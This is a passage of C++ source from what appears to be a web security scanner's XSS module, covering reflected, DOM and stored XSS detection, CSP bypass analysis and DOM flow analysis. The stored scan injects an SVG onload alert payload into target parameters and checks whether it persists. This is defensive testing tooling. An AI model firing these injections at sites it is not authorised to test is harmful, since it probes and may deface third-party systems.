        if (use_browser) {
            dom_xss::scan_options_t opts;
            opts.include_polyglot = true;
            opts.include_standard = true;
            opts.include_dom_only = true;
            opts.capture_screenshots = false;
            opts.per_payload_timeout_ms = std::min(std::max(timeout_ms / 3, 3000), 15000);
            opts.max_payloads_per_point = 8;
            opts.deadline_ms = now_ms_steady() + static_cast<uint64_t>(std::min(std::max(timeout_ms, 10000), 120000));
            opts.scheme = target.scheme;
            opts.host = target.host;
            opts.port = target.port;
            opts.cancelled = []() { return cancelled(); };
            browser_issues = dom_xss::scan_insertion_point(ip, opts);
        }
        if (confirmed || browser_issues > 0) {
            session.vulnerable = true;
            json issues_created = json::array();
            uint64_t issue_id = 0;
            if (confirmed) {
                issue_id = add_issue("xss.reflected", "Cross-Site Scripting (reflected)", severity_t::high, confidence_t::firm, target, ip, confirmed_resp, marker, "marker reflected in " + context + " context; " + snippet_around(confirmed_resp, marker, 120));
                session.issue_ids.push_back(issue_id);
                append_issue(issues_created, issue_id);
            }
            json item;
            item["parameter"] = ip.name;
            item["insertion_point"] = ip.kind;
        item["xss_type"] = confirmed ? "reflected" : "dom";
        item["context"] = context;
        item["payload_hash"] = confirmed_payload.empty() ? "" : hex64(fnv1a64(confirmed_payload));
        item["marker_reflected"] = true;
        item["execution_surface_observed"] = confirmed;
            item["encoding_applied"] = "none";
            item["issues_created"] = issues_created;
            item["browser_issues_emitted"] = browser_issues;
            item["context_evidence"] = ctx_evidence;
            item["probe_evidence"] = probe_evidence;
            vulnerable.push_back(item);
        }
    }
    session.vulnerable_params = vulnerable;
    session.dom_findings = dom_findings;
    json data = session_status(session);
    data["vulnerable_params"] = vulnerable;
    data["dom_findings"] = dom_findings;
    data["proof_ready"] = session.vulnerable;
    data["proof_pending"] = false;
    data["status"] = cancelled() ? "cancelled" : "complete";
    session.status = data["status"];
    session.results.push_back({{"action", "detect"}, {"result", data}});
    update_session(session);
    return ok_result(session.vulnerable ? "XSS evidence observed" : "XSS probes completed without confirmed evidence", data);
}

engine_result_t stored_scan(const json& params)
{
    request_target_t target;
    std::string err;
    if (!build_request(params, target, err)) return error_result(err, "invalid_request");
    const int timeout_ms = json_int(params, "timeout_ms", 45000, 1000, 180000);
    auto points = candidate_points(target, json_string(params, "param_target"));
    if (points.empty()) return error_result("no insertion points matched request", "no_insertion_points");
    request_target_t verify_target = target;
    const std::string verify_url = json_string(params, "verify_url");
    if (!verify_url.empty()) {
        auto parsed_verify = get_target_from_url(verify_url, target.enforce_scope);
        if (!parsed_verify.has_value()) return error_result("invalid verify_url", "invalid_verify_url");
        verify_target = *parsed_verify;
    }
    xss_session_t session;
    session.session_id = make_id("xss");
    session.url = target.url;
    session.host = target.host;
    session.path = target.path;
    session.created_ms = now_ms_wall();
    session.updated_ms = session.created_ms;
    json findings = json::array();
    for (const auto& ip : points) {
        if (cancelled()) break;
        const std::string marker = make_id("AIDASTORED");
        const std::string payload = "<svg data-aida=\"" + marker + "\" onload=alert('" + marker + "')>";
        auto store_resp = send_raw(target, build_injected(ip, payload), timeout_ms, "offensive_xss.stored_submit");
        if (!store_resp.has_value()) continue;
        auto verify_resp = send_raw(verify_target, verify_target.raw, timeout_ms, "offensive_xss.stored_verify");
        json item;
        item["parameter"] = ip.name;
        item["insertion_point"] = ip.kind;
        item["submit_response"] = response_summary(*store_resp);
        if (verify_resp.has_value()) {
            const bool marker_reflected = body_contains(*verify_resp, marker);
            const bool persisted = executable_reflection_observed(*verify_resp, payload, marker, "html");
            item["verify_response"] = response_summary(*verify_resp);
            item["marker_reflected"] = marker_reflected;
            item["execution_surface_observed"] = persisted;
            item["stored_marker_observed"] = persisted;
            item["evidence"] = persisted ? snippet_around(*verify_resp, marker, 120) : "";
            if (persisted) {
                session.vulnerable = true;
                json issue_ids = json::array();
                uint64_t issue_id = add_issue("xss.stored", "Cross-Site Scripting (stored)", severity_t::high, confidence_t::firm, verify_target, ip, *verify_resp, marker, "stored marker observed during clean verification fetch");
                session.issue_ids.push_back(issue_id);
                append_issue(issue_ids, issue_id);
                item["issues_created"] = issue_ids;
            }
        } else {
            item["stored_marker_observed"] = false;
            item["evidence"] = {{"transport_error", audit_http::last_error()}};
        }
        findings.push_back(item);
    }
    session.vulnerable_params = findings;
    json data = session_status(session);
    data["stored_findings"] = findings;
    data["proof_ready"] = session.vulnerable;
    if (!session.vulnerable) data["status_reason"] = "no stored marker observed during verification fetch";
    session.results.push_back({{"action", "stored_scan"}, {"result", data}});
    update_session(session);
    return ok_result("Stored XSS scan completed", data);
}

engine_result_t test_csp_bypass(const json& params)
{
    std::string csp_header = json_string(params, "csp_header");
    std::string url = json_string(params, "url");
    int status_code = 0;
    bool report_only = json_bool(params, "report_only", false);
    if (csp_header.empty()) {
        if (url.empty()) return error_result("missing url or csp_header", "missing_csp_input");
        request_target_t target;
        std::string err;
        if (!build_request(params, target, err)) return error_result(err, "invalid_request");
        auto resp = send_raw(target, target.raw, json_int(params, "timeout_ms", 30000, 1000, 120000), "offensive_xss.csp_fetch");
        if (!resp.has_value()) return error_result("CSP fetch failed", "transport_failed", {{"transport_error", audit_http::last_error()}});
        status_code = resp->status_code;
        csp_header = header_value(resp->resp_headers, "Content-Security-Policy");
        if (csp_header.empty()) {
            csp_header = header_value(resp->resp_headers, "Content-Security-Policy-Report-Only");
            report_only = !csp_header.empty();
        }
    }
    auto analyzed = csp::analyze(csp_header, report_only);
    json bypasses = analyze_csp_bypasses(analyzed);
    json data = csp_result_to_json(analyzed);
    data["url"] = url;
    data["status_code"] = status_code;
    data["csp_header"] = redact_sensitive_text(csp_header, 4096);
    data["bypasses_found"] = bypasses["bypasses_found"];
    data["candidate_bypasses"] = bypasses["candidate_bypasses"];
    data["no_bypass"] = bypasses["no_bypass"];
    data["proof_ready"] = !data["bypasses_found"].empty();
    return ok_result("CSP bypass analysis completed", data);
}

engine_result_t dom_analyze(const json& params)
{
    request_target_t target;
    std::string err;
    if (!build_request(params, target, err)) return error_result(err, "invalid_request");
    const int timeout_ms = json_int(params, "timeout_ms", 30000, 1000, 120000);
    auto resp = send_raw(target, target.raw, timeout_ms, "offensive_xss.dom_analyze");
    if (!resp.has_value()) return error_result("DOM analysis fetch failed", "transport_failed", {{"transport_error", audit_http::last_error()}});
    json data = static_dom_scan(body_text(*resp));
    data["url"] = target.url;
    data["response"] = response_summary(*resp);
    data["proof_ready"] = !data["dangerous_flows"].empty();
    data["exploitation_confirmed"] = false;
    return ok_result("DOM XSS analysis completed", data);
}

engine_result_t get_status(const json& params)
{
    xss_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    return ok_result("XSS session status", session_status(session));
}

engine_result_t get_results(const json& params)
{
    xss_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    json data = session_status(session);
    data["results"] = session.results;
    data["result_count"] = session.results.size();
    data["format"] = json_string(params, "format", "json");
    return ok_result("XSS session results", data);
}

}
}
}
}
